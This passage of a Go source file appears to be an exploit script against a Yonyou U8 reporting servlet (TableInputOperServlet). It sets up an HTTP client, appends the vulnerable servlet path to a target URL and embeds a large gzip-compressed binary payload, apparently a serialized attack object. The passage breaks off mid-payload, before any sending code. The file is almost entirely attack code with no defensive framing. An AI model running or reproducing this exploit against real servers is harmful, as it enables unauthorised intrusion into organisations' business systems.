package u8_TableInputOperServlet

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	url = url + "/service/~iufo/com.ufsoft.iuforeport.tableinput.TableInputOperServlet"
	data := "{{unquote(\"\\x1f\\x8b\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xcd\\x7b\\xcb\\x8f+\\xebvW\\xdf\\x7d\\xeeU\\xc8\\x09\\x2877R\\x14\\x89\\x01\\xad\\xcd\\xa4;g\\xd3m\\xbb\\xdd\\xbd\\xbb\\xb3u\\x80\\xf5\\xd5\\xcb\\xe5g\\x97\\xcb\\xcf:\\x8a\\xa0\\\\\\xae.\\xbb\\xab\\xecr\\xbb\\xca.\\xdb\\x87\\xc3\\x00\\x09Eb\\x94\\xc1\\x0d\\x11B\\x02\\x06\\xcc\\x80H\\x88A\\\"\\x10B\\x11\\x03\\x06\\x88H0!\\x0acD\\x06 \\xc1_\\x00\\xbfUew\\xbb\\xdd\\xbd\\xf7\\xd97\\x08\\x89\\xad\\xed.\\xbb\\xbe\\xf5\\xad\\xe7o=\\xber\\xf7?\\xfd\\x1fG?\\x8a\\xe6G\\xbfto/\\xed\\xb3E<\\x0e\\xceJv42\\xdd\\xf8_\\xca\\x7f\\xfb\\xb7\\xff\\xee\\xef\\xff^\\xf1\\x8b\\xa3\\xa3\\xd5,\\xf9\\xb3GGGo\\xfe\\xca_=\\xe2\\x7f?\\x00\\x7d1\\x9c\\x7bg\\xf6\\xccvF\\xee\\x99\\x13N&\\xe14\\xc25\\x08\\\\'\\x1e\\xf3\\x7b\\xdf]/\\xed`\\xe1\\x9e\\xb5\\xc6\\xee\\xb0f\\xcf\\x94i<_\\xff\\x9d\\x7f\\xf6\\x9f\\xfe\\xfe\\xcd\\x1f\\xfc\\x85\\xff\\xf2\\xe6\\xe8M\\xf5\\xe8\\x0b\\x90\\xc4G?\\xa9\\xb2\\xe0\\xf3\\xc0\\x9ez\\xe7\\x8d\\xc1=\\xb6\\x7f\\xc0\\xd2\\xc4\\x9e\\xc5G\\xbf\\x98-\\xb1N\\xe7\\xe0\\xf0a\\x85\\x7b_\\xdc\\x85!\\xa4\\xff\\xda\\xf7H\\xc7\\xfe\\xb3\\xaa\\xbdYc\\xdb\\xf4\\xbf\\xfe\\xf4o\\xfd\\x83\\xf5\\x8f\\x7f\\xfa\\xc5\\xd1\\x0f\\xaaG?wg;q8\\x87\\xdcwU\\xb08\\xcfX\\x9coY\\x9c\\xef\\xb18o\\xcd\\xedit\\x17\\xce'\\xee\\x1c\\x92!\\xf3\\xd7\\xbfG\\xe6\\xddb\\xca\\xbc\\xa33id\\x8f\\xa7\\xeep\\x8fA\\xee\\xdf\\xfd\\xce\\x7f?\\xd9\\xfc\\xce\\x0f\\xdf\\x1c\\xfd\\xe0\\x9b\\xa3?7\\xde[\\x89\\xe2\\xa3\\xbf\\xf4\\xcd\\xcf\\xa6\\xcab\\xbe\\xdd\\xf2\\x29e\\xf6\\xb7\\xfc\\xeb\\xce\\xaf\\xfd\\xaf?*\\xfe\\xea\\xdf\\x7b\\xc3\\x81D\\xf8~\\x08c>|\\xb61\\xf8\\x14\\xdb\\xd3x\\x8fao\\xf9[\\xbfDo\\xfe\\xf9O\\xdf\\xb0G\\x7f~\\xbc\\xa3x8\\xfa\\x9bG_\\xacf\\xcb\\xf9\\xd11\\xc7mu\\x169\\xf3\\xf1,>3\\xd3\\x8b2\\xf5\\xe0\\x94\\x9a=\\xb5=w~\\xf4\\xf4\\xefgs\\xad>]\\x86\\xbe;\\xdfS\\xe67\\xff\\xe4\\x7f\\xfb\\xdf\\xfe\\x8d?\\xbc~s\\xf4\\xc57G?\\x1a\\xd3\\xdc\\x83K\\x7f\\xf9\\x9b\\xd7P\\xf5\\x0b\\xe3\\x9a\\x1b\\x8f\\xc2a\\xdd\\x9e\\xb8\\xcf\\x81g\\xc6\\xf3\\xf1\\xd4\\xfb\\xf0\\x0dHn\\xed\\xb9=i\\xadg.\\xd8\\xfcd\\x9f\\x8d\\x14\\xd8Q\\x94\\xb9\\x7f\\xcb\\xfe\\x8c\\xef\\x9fm\\xd9\\xff\\xd6\\x1f\\xf6\\xfe\\xe1\\x8f\\xa3\\xd3`\\xe7\\xe4\\xa3\\xf8\\xe8\\x17\\xa6n\\xa2\\xa7\\xbeq\\\\\\xec\\xfa\\xc9\\xfe\\xae\\x8c\\xdb?\\xf9\\x95\\xff\\xfc\\xbb\\xff\\xfe?X\\x8f\\x919\\x8a\\xd8\\x89\\xbf\\xbc\\xe0\\x9f\\xbf\\xca\\x89\\x16\\x1f\\xbd\\xb9\\x87\\\"\\xbf\\xe8\\xb9[\\x07\\x8a5k\\x9f\\x12\\xfcy&\\x80\\xb7\\x7f\\xfc\\xc45\\xb3\\xe3\\x1f\\xfd\\xcf\\x7f|\\xbd\\xf9\\xf0/D\\xca\\xf5\\x05\\xc7\\xe2%\\x12\\xf1\\xf8\\xdb/\\x8f\\x8f\\x83\\xd0\\x1e\\x9e\\xbc\\x9d\\\"\\xdb\\xc3\\xf9\\xf4\\xd7'\\xe1f\\x1c\\x04\\xf6_\\x83\\xffgv|v\\x1f\\xbd=\\xfd\\xf0\\xe5w\\xc7\\x8e\\x1d;\\xa3\\xe3\\x13\\xf7\\xf4\\xf8\\xdb\\xef\\xbeL\\xe3\\x80\\x88\\x1cC\\x9f\\xf64\\xb2\\xef\\xdc\\x93S\\xe6\\xb4\\xb4\\xe7\\xc7\\xf1\\xc8\\xcdneN>\\xfe\\xfa\\xf8\\xc0\\xda3\\x04\\x8c\\x95?y\\x1b-\\xa6g\\x93q\\xe4\\x9ce\\x1b\\xde\\x9e\\x9e\\x81\\x9f\\xec:\\x81=w\\x87\\xea\\xd8\\x0d\\xa0\\xd6#;V\\xe3\\xf8\\x90\\xfbY\\xe4\\xc6\\xe48n\\x14\\x8d\\x07\\x81\\x7b\\x12\\xcf\\x17\\xee\\xe9\\x87c\\xd0\\xcd\\xddx1\\x9f\\xbe \\x07\\xff\\x93\\xe9\\\"\\x08\\xd8\\xa4'+\\xe6\\xee$\\\\\\xba\\xa9r\\x12c\\xef\\x04\\x1al6\\x8f\\x16-R\\x0e0d\\xcf\\xda\\x0f\\xdb\\xb5\\x94\\x92\\xa6\\xe1t=\\x09\\x17Q\\xca\\x02\\x84\\xd9\\x8e\\xb3\\xa1\\x7b\\x87P=_\\xcdx\\xbf\\xfb\\xa8O\\x0e\\x162\\x9f4\\xdd\\x28\\\\\\xcc\\x1d\\x97\\\"D\\xd6\\xb5''o\\xb3]\\xce\\x96\\x04\\xf7\\x86\\x14\\x04b\\x1d\\xbb\\xd1\\xc9\\xe9\\xbb\\xad\\x85\\x99\\x86s\\xf7n\\x9b?\\xb2\\x1d\\xdb\\xa9W\\xa1\\xe1+z\\xbf\\xe2\\xfc\\xe7\\x7b\\xb3\\x08lm\\x9b-\\xe2\\x0c\\xf1[\\x83\\xb6\\xb7\\xc3\\xf4^\\xba\\xbdqw\\x87\\xe8\\x9c\\xbc\\\"\\xffQ\\xc3\\xbd\\x18\\x0c\\xd63\\xe8\\xd0|$V\\xc7A\\xec\\xceON\\x8f\\xbf\\x7daG\\x963\\x0c\\x86-\\x80\\x8f\\x0f\\x17?\\x05\\xba\\xfb\\xa1\\x7f6\\x9e\\x82\\xf7\\xd4\\x0e\\xce\\xb6\\xfb\\xce\\x9e\\xe4fF>\\xe1\\x7d>\\x0f\\xe7\\xa7?\\xbb\\x14\\x86\\xf6G\\x99\\x7f\\x1e\\xae\\xa2H,\\xee\\xee\\xdc9\\x08\\x0e\\x04\\xbf\\x0e\\x89'1\\x1f\\xc1\\xc5KD\\xfcL\\xc0=P\\xe2\\xdd\\xbe\\x8e\\xef\\x8e\\x9fa\\xee\\x8e\\xa3\\x9cE\\x10\\x9dw\\x87\\xb9\\x8f\\xc9\\x7d\\x05x\\xcf\\x19\\xbc\\x7dd<I\\xd3\\xf8\\xff\\x86\\xf3\\x01\\x87\\x8c\\xf5\\xf8\\xee\\xf8\\xe4\\x15\\x9dy;\\xb7\\x80\\x93\\xd3\\xb3qD\\xa81\\xde\\xd4F\\x99Q\\xe7\\xe1\\xe4\\xe4\\xd3\\x09\\xfc8?\\xa5\\\"Nw\\x00z\\x91;/|\\xba\\xa5@\\xb3\\x88\\xc7\\xce~\\x1a\\xbd\\xa2\\xde\\xe9\\xbbO\\xa0\\xfc\\xa5\\x16lM\\xda\\xa3\\xe7\\x0bn\\xa20j\\xaf/\\x9d\\x9c>B\\x93\\x9d\\xf1\\x9a\\x9f\\xff\\x7f\\xf2\\xc6k\\xfa\\xfd?r\\xc7\\x8b\\xe6\\xf0\\xf9\\xa5\\xfby\\x85\\x7b\\xde\\xaa\\xec\\xc7\\xb7\\x99\\xf1\\xa7\\x99O>U\\x17\\xb2U\\x283\\x9f\\x8f\\x87\\xee\\x0e\\xfb\\x9f\\xa1\\xce\\xae\\x10\\xd1\\x81\\xccW\\x1b\\xee\\x8e\\xff\\xdb\\x7d\\x99\\xa9\\xd7\\x9f\\xea\\xc3\\xcb*\\xffL\\xab\\xed\\xce\\xa7\\xf8\\x8a0\\x0c\\\\\\x7b\\xfa\\xc2\\xe8w[\\xce\\xef\\x8e\\xb3\\xce\\xbd\\xef\\xae\\xac\\x06e\\xa5g\\xc0\\x05\\xec\\xb1\\x1f;\\xc1\\x06\\xaap\\xc1\\xd9\\x95\\x05\\x08\\x8fx\\xcf\\xbe7\\xccu\\x14\\xbb\\x136\\xf0v\\x1e\\xce\\xdcy\\xbc\\xde\\xbadK\\xfcTT\\xbe\\xb7\\x0eW1 \\xa5u\\x18\\x08\\xc9$L\\xdd\\xf8\\xac\\xdd\\xacJO\\xab'\\xaf\\xb8\\x7b>\\xb7\\xd7\\xcfP\\xf5\\xe9Xm\\x99\\xbe\\x05\\x90s\\x19\\xfe\\xd0\\xe02XpNn\\xf5>\\x8bf\\xc18>y\\x7b\\xf6\\xf6\\xf4\\x9b\\xdco\\x1c\\xff\\xe5\\xaf\\x8f\\xf3\\xf9]F\\x1d\\x7f\\xb4\\x8df\\x11\\xd9\\xf3\\xe9\\xf7Og\\x07\\x0b\\x99\\x99\\xcf!\\x9319y\\xbb\\xc7\\xf7\\xed'\\xb2\\xf0\\x1b\\x01\\xdb\\x9eVuta\\x1c\\x02\\xceZ\\xfd[e\\x7f\\xd7\\xfe\\xfd\\xad\\xe2\\xcfs\\xe7\\x85\\x19[\\xaa\\xf3\\xf3\\xe3\\xff\\xf6\\xaf~\\xfbO\\xfe\\xcdo>\\xa7?N\\x173\\xd4\\xbc\\xd8\\x8aY\\x80\\x8f\\x12'\\x7b\\x81~w\\x9c\\xe2\\x0dQ\\xd8\\xbe;\\x0b\\xdc\\xa9\\x17\\x8f\\xb6R\\xbes\\x83\\xc8\\xdd\\xf9\\x9b12\\x9b\\x87\\xf1v\\xc2\\x09'8\\xf2\\xed\\x03%r\\x9d\\xc5|\\x1c\\xaf\\xcfn\\x0f\\x88N^\\x92H\\xe1\\xd05\\xd3\\xa6\\x9e\\xce\\xa8\\xfb.\\xf9\\xd3B\\xea\\x91\\xb7\\x83\\x048\\x93\\xf0c|7\\xc6h\\xe3nA\\x96\\xf5\\xedw\\xc7\\xcf\\xac\\xff\\xe67\\xb6\\x96\\xee\\x9c\\xf6l*\\xc822\\xdb\\xf6\\xba\\x9f\\x0e\\xd8\\x1d\\xbag\\xe7F\\xae\\xaf\\xe9\\x94\\xb5\\x1d\\xb22\\x97\\xa6\\xef\\xcff8\\xbf\\xc4fl;>\\x8ex\\xce6\\x1f\\xbf\\x83x;\\x08\\xd6\\xbba,\\x9d\\xf0\\xa1aV\\xa9\\xf7gI;r\\xaf\\x8a\\x00\\x29\\x1c\\xda\\x0ay\\xfa9A\\x99\\x7f\\x1a%\\x07\\xf1\\xb3\\xe4\\x1a\\xc4\\x9fuH\\x11d*;\\xae\\x9c\\x07\\xcf\\xda\\x05\\x9c\\xc3\\xf7\\xb3i\\x28\\x95\\xf6a\\xcf\\xbe\\xd3ow\\x8d\\x95ee\\xb5kk\\xef\\xa3\\x16\\xdf\\xa7\\xc7S\\x0b\\x13\\xa9y/4\\xc8\\xf2\\x92\\x95\\x7bT\\xe7Q\\x91CU2u>S\\x9b=\\xa1\\x7f\\x0a!\\xaf\\xd8\\xfciC_\\x7d\\x06\\x00Qg\\x03\\x84\\x7f\\xbe\\xfe\\x98\\xf9\\x07\\xca|\\xf7t\\x08\\xe4p\\x7f\\xf7eZ\\xcdA\\xf1\\xf5\\xdb\\xf5\\xf2\\xeaj\\xe9\\x11\\x91\\xac\\x88\\x89\\x17R\\xc9\\x93b\\xc9\\x132U\\x8a\\x15Rj4O\\xd2\\x7b\\x89D\\xd2J\\xf2\\xc8\\xa1\\xaa^\\xa1j\\x8db\\x0a\\x29J\\xa4\\xbcH\\xa4BJ_ut\\xaa\\xb4+$\\x29\\xb4 \\x8f\\x16\\x06^\\x9eC\\x8b\\xc4\\xa3%>/\\x0d\\x87\\x96\\xcc\\x9f\\xa4s\\x89d\\xc2K\\x88D\\x96\\xa4\\x84\\xbaT\\xabU\\xa9f\\xd0\\xca\\x88hE\\xb2\\x86\\xb5\\x12^:\\xd6\\xcb\\xa9\\xccZX\\xa2ZT\\xa1ZB\\x1b\\xf0\\xdd\\x80\\xef\\x06|s\\xd0\\xe1>\\x91\\x9b\\xa0\\x19Q]\\xd7\\xa9^+S\\xdd\\xa0\\xbc\\x11R\\x9e\\xe4.x\\xf4$O\\xba\\xa5\\xbaW!\\x91P\\x01\\x7b\\x0b\\xd8[`\\x9bHv\\xb0>\\x84\\x0c\\x17\\xd7;\\xbc\\xbcTVC\\x29QCOm/\\x82\\xee\\x92\\xe4>\\xd6\\x82TF\\xa3\\xafS\\xc3Im\\xbc\\x82MW\\x90\\xa3\\x1b\\xf2C*\\xa3\\x11a-I\\xd7\\xdeC\\xce\\x7b\\xcfg\\xdd\\x96\\x92'\\xb7\\xe9\\x96\\xca\\xa4_\\xd35|p\\x0d\\x1f\\x18\\x89\\xbcI\\x7dvk\\xc0g\\xe0y\\xdb\\xc6\\xab_a\\x9a\\x1b\\xd8\\xf5Uf\\xd7%t\\xbb\\x02]\\x8dn\\xa3\\x12\\xdd\\x82\\xb7R\\xa4s#]\\xfb\\x0a\\xf7\\x1bt\\x7b\\xcd\\xf7\\x04\\x81\\xbe\\xe5\\x29BbW\\x1b\\xac\\x7b\\\"\\x28a\\xdd\\x14E\\\"E\\x95<E##\\xd5[H\\xe4\\x09\\xc9\\xc0\\xcb\\xc3+q\\xa0DH=#\\x8d\\xf9\\x90\\x8c\\x9cN\\x06\\xe2\\xae\\xe6\\x04a]N<\\xa1\\x80^\\x01\\xbd\\xe2\\x85BI\\x946x\\xb5\\xa8\\xd9.Q\\x13\\xfa6\\x1d\\xa1a\\xbfM\\x8a\\x0596x\\x84\\xd4D\\x9c4\\x0f\\xb1L\\xef;\\xa0\\xefQ3\\x97\\xd2\\x96\\xc0\\xb3\\x04\\x9e:\\xa5\\xbcF\\\"Q\\xc6\\xd8\\x93#\\xb3V\\xa1\\x92\\xc1\\xbc\\x84\\x9a\\x28~v\\xcfH\\xef\\x95\\x8dP\\x94=e\\x0a>\\x132\\x11G\\xd3\\x17\\x15\\xe8R1\\x14\\x12\\x06\\xed\\xfe\\xadS\\x7f\\x9aQ*\\xa7\\x0a\\x9d\\x86\\xc4\\xb6*q\\xea\\x13\\xb3\\xa8\\x93y\\xadS\\x8b*\\xc0\\x87\\xa8\\xa5>T\\xd6X\\xdf\\xe0\\x95\\xc3+\\x8fW\\x01\\x18\\x9f\\xe1z\\x01\\xbd\\x8ad\\x00\\x91\\xbe\\xdaj\\xb6\\xfa\\xb9^\\xae\\xae\\x1b\\x9dr\\x0b\\xf7\\xcc\\x966\\x1b\\x0d'\\xcar\\xa0\\xa9\\x0bk\\x7d\\xd3\\x1a\\x96\\xca\\xb3\\xc1\\xc4y\\x8f\\xb5\\xbaQ\\xb8Y8\\x17\\xcd\\xd1`\\xda\\xec\\xf6\\xbb\\xab\\xbc\\x05\\xbf5\\xa0'M\\x82\\x04\\xeb\\x8a\\xa3\\xdd\\xac\\xa1\\x17$\\xae\\x1e\\xfa=kT-\\xacF\\xd8\\xbb4\\xbb\\x979\\xab;\\x0c\\x9c\\xfb\\x08\\xb1\\xec_\\xdb\\xdd\\xcb\\xd9P\\xe6\\xb8\\xd6\\xc2J\\xa7\\x8fkS\\x1e\\x14\\x9a\\x01x\\xdc\\xb6\\xb4`a\\xb5/\\xf3\\x83n9p\\x82\\xe6\\xa8?Y\\xf1\\xfdJ\\xb37\\xba\\xb7z\\\"gw\\xa1C\\xa2\\x90\\xd4]-\\xfb]\\xec\\xd3\\xd4\\x0d\\x7f.\\x9b\\x98\\xf4'j\\xa1o\\xdeD\\xfd\\xee\\xe5\\xb4\\x9a\\xaf\\xe7\\x9c\\x09xm\\xa2\\xd9\\x81M\\xd9\\x9e\\x0d\\xeb\\x12\\xb4\\xec\\xeep\\xd1\\xef5\\xf3\\xce\\xa4-H\\xf2\\xc2\\x8f\\xd9_i?\\xb7\\xc9\\xc0\\xd5\\xb9\\xa8]W\\xee\\x8b\\xec\\x1b\\xd5\\x29\\x95\\x97n\\xc9\\x07\\x8f\\xfeg\\xf3h_4\\xd7\\xf0\\xc5\\xb4\\x01\\xfdEo\\xb8\\xb6\\x7b\\xa9\\x0f\\x8a\\x15\\xe5#t\\xb9\\x8f\\xdc_\\x07\\x1f\\xb3\\x1d6\\xce\\xee\\x07Zg\\xe4\\x04b\\xe4L\\xd4\\x98\\xe3d\\xf5FA\\x9fe^\\x94\\x83\\xe1\\xa4\\xb3v\\x0al\\xbb\\xf3Q\\xbdM\\xf3S\\xfc\\xeb\\xeba\\x97ci\\xf9V\\xb7\\xbe\\xb44\\xf0\\x12\\x9f\\xf0A'\\x968\\x9e\\xed\\xc2\\x0d|^\\x0f\\x9a\\x93 \\xb2\\x18\\xeb9%W\\x9d\\xa4\\x7bjTvhB\\x89hx\\xca\\x7b\\x99\\x94kj\\xe5j\\xd4*\\x8a\\xdbT\\xe7f\\xe8L:#\\xabT\\xabQ\\x1b\\x29b8\\xc2\\xf0\\x12a$\\xaa\\\"\\x93\\xaaR\\x1bx\\x12\\xf5\\xc1\\x81\\xfc\\xb6]*\\x07\\xfd\\xae\\x01~j\\x89\\xda\\x1e\\xf6\\xfa\\xc2\\xf4\\xc0O\\x1b\\xe5\\x86%b\\xfds\\xfd^yj\\xf5\\x0c\\xec/?\\xf7\\xf3\\xb4\\xb3\\x18L\\xd4\\xf1\\x80m\\x03\\x9d\\xad\\x05\\x9b\\xb2\\xcc\\x7b\\x86!\\xfc\\xe1\\xc3\\xbfk\\xd8\\xe4>\\xf3Q\\xee\\x12\\xf1\\xe9\\xdc\\xdb\\x8a5\\xb3\\xba+\\x7f\\x1f\\xbf\\xd0\\xa1J\\xadk\\xe65\\x1dh7\\xe3~7\\xe18%\\xce\\xe4\\x064\\xf5\\xcd\\xe0\\xa2\\xbc\\x01\\xbf\\xc6\\x96_~\\xa8\\x05Q5\\xb7\\x9a9\\x17\\x06\\xf4ND\\x0b6\\xb7`s+Q\\x0d\\xf0jRGO\\xe3`\\xf5\\x14\\\\c\\xd8\\xd04\\xc1'\\x19\\x14.7\\xec[\\xb9\\xf0\\x0a\\xfe\\x93D\\xb4\\x13\\xb5\\x0d9\\xc6s\\xbdo\\xc6\\xf6\\xa4s?$Gt\\x8cDt<\\xb5\\x07\\x9a\\xb2U\\xe8\\xe4L\\xe0\\xc8\\xcal5^\\xc5\\x03\\xe2C\\x85zlQ\\x82\\x0a%\\x8d\\xa0[\\x9f:>\\xe7\\xd9\\x06:\\xb5\\x86\\x9a\\x9a\\x1b\\xf6j%\\xea\\x845\\xeaD\\xa2\\x87\\x18\\xf7\\x0c\\xd5\\x05?\\x1f6O\\xab\\x135\\xe9w\\xeb\\xa1e^\\xe6\\x06\\x85\\xfc\\x7d\\xbfg,\\x86\\xbd\\xe6l ]\\x8e\\x87\\xdd\\xfe\\xc2\\x98\\x069\\xab]\\x0f\\x87\\xdd\\xcb9:\\xacCe\\xe0\\xa2s-\\xda\\x88\\xa3T\\xaa\\x07C\\xa5|9\\xd4:\\xec;\\xa9\\x9b\\xd3k\\xe8\\xbc\\xa2\\x83z$\\x0a\\xcde\\xe7\\xa2<\\x1b\\xa6\\xd8\\xac?\\x8b\\xed~\\\\\\xb0\\xaf\\x95\\xd9u\\xb9\\xb0\\xbb\\xd7[y\\xe5\\xbc5\\xb1\\x02\\x87\\xb1R\\x1a\\xae\\xfb=\\x02_\\x85\\xa6\\xf0\\xab\\xfeZ]A\\xdc\\x87\\x8a\\xb5\\x84\\x8e\\x871\\x1fS\\x17\\xb6w\\x81/b\\x1ema\\x81\\xa7\\xa2\\xd5\\x97\\x83n\\x1e\\xba\\x18\\xde`r\\x93\\xd35\\xd4>-\\xc1\\xba#L\\xd6\\xdd\\xac\\xdd\\xeb\\xeb\\xda=\\xf6\\x87\\xd4\\xf5kT1\\x28\\xe4\\x9a\\xdb\\x82\\x0f\\xbb\\xa1\\xb0\\xe1s\\x7d\\xf2\\xc4\\x03\\xb9Q\\xb0z\\xe5\\x8de\\x8appQ\\x07?k\\xe9L\\xf2\\xa3\\xa1$\\x02gZ^:c\\xce/8\\x1c\\xb1\\x1d\\x90\\x1a\\xc3\\x8f\\x1d*s\\xce\\x88g~\\xe9h\\xa3\\xb5\\xd5U\\x7d\\xac\\xf7\\xa8[\\x84\\xack\\xe4$\\xebc\\xf8e\\xc9\\xf0\\xb9WX\\x9c\\xbb\\xa6\\x98 v1b\\xe5A\\xeezp\\xa1#\\xee\\xd2\\x98*5\\xd8\\xd9!\\x03\\x904\\x80\\x87\\x99!\\x8d\\xb8\\xe7lq3\\x1b\\xaco4\\xbb\\xbb\\x0aR\\xfe=\\xe4\\x92\\x18m\\xe5\\x07\\xcbj\\xce\\x9a!\\xa7n\\x11\\xfbd\\xc8\\xb8Is7\\xc7uA8FB\\x0f\\x86\\xf4\\x90\\xca\\xe8!\\xc6\\xbdZZ+\\x86\\x28\\xbc\\xf0Q>\\xcd\\xed^\\x1f\\xbe\\xc3\\xbdD\\xe5>W\\x1a\\\\\\xd48\\x7fc\\x0by\\xe3\\xc2n\\xd7K\\xb1\\xf9\\x1e\\xb4\\x9c7\\x17vZ\\xbf\\x9a\\x09\\xd7R\\xc6N\\x95?\\x8b\\xe1\\xab\\xb5\\xd6\\x98v\\xa0[\\x13xH\\xc4\\x1d\\xa97\\\\\\xfbu\\x29\\xbf\\xd0e\\x8e\\xab\\xbeL\\xeb\\xaaI\\xf1P\\xc2\\xf8\\x06^N\\x81e\\xe8q\\x1f\\xb3\\xc8\\x1d\\xefI4\\x9e\\x0e\\x03\\xea\\xc31B\\xcdd\\\\t\\x80\\x91d\\xd9.\\xd4!\\xeb\\x12\\xbc\\x1d\\xe1\\x81\\xd6K4%\\xf5O\\x9f\\xebN\\xd9\\xe9C\\xf7\\x91\\xa7\\x95\\xd2\\x9cg;\\xfb\\x9e\\x18\\xc1\\xce\\xb1!\\xf5\\xd9\\xcej\\x015v|\\xb3\\xb1S\\xcc#\\x0f\\xa5\\xcb\\xc0\\xd5\\xda\\xc0L[\\x8c\\xbd\\xbd:0\\xe9\\xe4\\x90\\xb3\\xcb~!\\x0e\\x86\\x88M\\x90hU\\x994\\xf0\\x83\\x8f\\xfbE\\xd1F\\xee\\xdf\\xa3>\\xf8\\xa45q\\xdf$\\x0b3\\xa3\\x85z[\\xd1E\\x00y\\x81\\xa1uq\\xbf\\x87\\xfb\\xb0!\\x8f\\xba\\x83\\xfc\\x98\\xd6\\x03]\\xeb\\x14\\xd1\\x03P\\xaf\\xda;,D\\xba\\x96\\xdfXk\\x8aoa\\xcf\\x04\\xae\\x82\\x9e\\x02s\\x1b\\xa6\\x90\\xc7\\xde\\xe3\\xa5\\xfd\\x08>\\x00\\x96\\x96\\xf6\\x1a\\xf8\\xb4|\\x01|\\xd2\\xcc\\x938\\x1e]\\xe7\\xa2\\xb3\\xa8N\\xf23\\xa7P[\\xecf\\x96\\xa6\\xd6\\xb9\\xe7\\x99\\x81\\xf3RF<\\xfa\\x85\\x1b\\x7f?W\\x95,7w\\xf5C\\xea\\xf7\\xeaA\\xfd\\x9ec4\\xe3\\xfa\\xa8d\\xbd*\\xade\\x93\\x83\\xda\\x03\\xbe\\xf9\\x98kgu\\x92\\xd2\\xdcW'\\xdc\\xbb\\xd4\\xb5k\\xee\\xf3\\x29\\x8b:\\xfcl`\\xfc4rM\\xb5\\xe9\\x0fu\\xb3=\\xab\\xb6\\x94|\\xa3\\x95\\x17\\xcdvPow:V\\xaf\\xab\\x06v\\xbf[\\xbe\\x07\\x9f\\x89U\\x18\\xcd\\xecI\\x1c\\x0d\\xba\\x97K\\xa7\\xa4\\xae1K\\xe5\\x87\\xd3a\\xd1\\xed\\x85I\\xad\\xa5o\\xea2\\x10\\xb0\\xf1.+k\\xee\\x0d\\xf9\\xfb!|hav\\xda\\xe5\\\"tmW\\xa4\\xc3^\\xbc\\xed\\x872\\xf7\\xe2K\\xb6m\\xdb\\xeb\\x9a%\\xf4\\x93\\xbc\\x03\\x1d5\\xd3;\\x9c\\x81\\x9e\\xd3\\xa4\\x7bG\\xbc\\xf7q\\x9eR\\xd6/\\xf6<\\xcdMB\\xec|\\x18\\xa1g\\x06\\xd6\\xb6\\xc7A\\xbf\\xf8\\xa3\\xb3\\xcb\\xe1\\x8c\\x82\\xf8[\\x98\\xed\\xfa\\x17\\xc6\\x123@0\\xd0\\x0c\\x9e\\xa3z\\xdfC\\xc3~\\xe1^\\\"\\xfa\\x85z\\xe0\\\\\\xd4g\\xdb\\xf9P\\xa9\\xa8\\xe1\\xac\\xe3q\\xff\\x19\\x06<\\x83\\x96\\xc7\\x07\\xf3\\xe0\\xae\\xaf\\xc9/\\xe6\\xc1\\xdb\\xfed\\xc62X~\\x89\\xfb\\\\+\\xad\\x15\\x0a\\xe1`qH\\xbb?\\x0f\\xeb\\xc0\\xdc\\x02=m6\\x98\\xa2\\xd6\\x89\\xe8p\\xe6\\x91mM]\\xb7\\x0b\\x9d\\xd5\\xb0\\xdbY\\xf4\\x0bm\\xcc>!\\xeb?M\\x7ba\\x0f\\xf5x\\xc2\\xfe\\xabs\\xbf\\xd2y\\xf6\\xc3|\\x96C\\xce\\xa4\\xf3\\xd3\\xe3\\xac\\xb8\\xad\\x0d\\xe6\\xd3:\\xcb6\\x9f\\xcf\\x06\\xe8S\\xbd\\xf2h\\x88\\xf9\\x9bm\\x80\\xdcMk\\xd2\\x29\\xb2\\x1f\\x08q\\xec\\xa6s\\x0ejA\\x89g\\x1b#<\\x9cC[\\x85\\xf2\\x03b\\x99k\\xa4s5\\xfc\\xa7\\xe4\\x83\\xa16ZZ\\x8co\\xe9csu|8c\\xed\\xf0q\\xe83`\\xd7\\x8a\\x98\\x7f5\\xb7\\xe5\\xcbx\\x7b\\xac\\xf7\\x99\\x0e\\xc0\\xf0\\x045\\xff~\\x28\\xdd\\xd4\\xe1\\x9fpP\\xe0X\\xa3\\x0fL\\xad\\xa5\\xcd\\xf3\\xa9\\xec\\x1f\\xfa\\xf71n\\xdd\\xdcG\\xec9\\xc4\\xdc\\x13\\x06vx\\x97\\\\\\xf6+\\xd7l\\xc4\\x1a3\\xc3SM><\\xbb\\xb0\\x0f\\xd5\\xa6\\xd5Vx\\x86P\\x0f\\xf8fqL\\xe7\\xf8\\x0bk4\\x28u\\x82V\\xa1\\x9f\\xc6\\xf1\\xc5\\xec\\x9c\\x0b\\x80\\x99\\x0ed\\xa7q\\xac\\xa2\\x16_@\\xc6\\x068b\\x8c0\\xef\\x83\\xdcz\\x8a\\x85\\x28\\xa0\\x97\\xfb\\x97\\xa3A\\x97\\xe9:Y\\xbe\\x16\\xa0_o\\x94\\xcb\\xce#\\xf5\\xda\\xa0\\xa0\\xfa\\xe0\\x8du\\xffE\\x9c\\x0fhX~\\xe75;Z\\xda\\xcdn\\xce\\xd3\\xac\\x9e\\x9a\\xc7Y\\x8f1\\xda9\\xcc\\xed=?\\xdb\\x9c\\x83in o\\xa4i\\x9dg\\xe9\\x9c\\x93\\x1fb\\xe6B\\xff\\x13\\xedO\\x9c\\x078':\\x1bG[\\xcd\\xd2\\xbc]\\x7f\\xfc\\x1cw\\x18\\xe7\\xfd\\xf3\\x93T\\xc2\\xf9\\x06=\\x88\\xe3\\xf5\\x9a\\xae\\x7bu\\xa8\\xccu\\xe6\\xc5\\xfa\\xd3\\x8c\\xff>;\\x93v8&\\xe9yV\\xfd\\xc4\\xd9\\x92k\\x8e\\xf2\\xb4\\xfe8\\xd7@N\\x97g\\x83\\x8a\\x1aK[~\\x13\\xe0\\\"\\xeb\\xcd\\x88-f3\\xae[:rv\\xe7\\x0b\\xd0\\xdcL\\xd3\\xda6\\xc5<WB?\\xec\\x88Q\\xea?\\x1a\\xa2\\xc7\\x0a\\xc8\\xe6=B9\\xd4\\xdd\\x28\\x8cp\\xbeC=\\xecu\\x82\\x01\\xceT\\x87\\xe7\\xc4\\x17\\xeb\\x9f:/\\x1e\\xcc\\x81\\xed\\x8b\\x00~\\xe8\\xf0\\xb9\\xb1\\xca\\xb5\\xb1\\x8ds\\xae\\x03l\\x0c\\xf9\\xacKqn\\x90[-\\x87\\x85\\xce\\xda\\x28\\xa8\\xe9YC\\xa0\\x8